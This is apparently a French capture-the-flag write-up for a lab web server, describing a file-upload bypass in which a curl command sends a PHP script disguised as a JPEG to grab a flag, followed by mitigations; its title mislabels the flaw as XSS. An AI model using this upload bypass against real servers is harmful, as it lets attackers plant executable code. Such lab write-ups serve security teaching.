# XSS Script injection

## Trouver la faille
Dans la page : http://192.168.0.32/index.php?page=upload
on peut forcer la lecture d'autre type de fichier comme php ou autre et on peut créer un script on peut faire ça en utilisant curl 

```bash
curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=simulate' -F 'uploaded=@script.php;type=image/jpeg' http://192.168.0.32/index.php?page=upload | grep flag
```

envoyer un formulaire avec deux valeurs
Upload : name du btn submit
uploaded : name du input file

## Comment utiliser cette faille
L'utilisation de cette faille permet de récuperer pleins d'infos du front comme du back

## Solution
Il y'a plusieurs solution pour éviter ça soit en faisant une vérification le type et le header de fichier en front et back pas seulement en front ou avec le fichier .htaccess ou aussi renommer les fichier uploadé ainsi que limiter les accée au dossier où on met les upload on enléve certainement le droit d'execution...
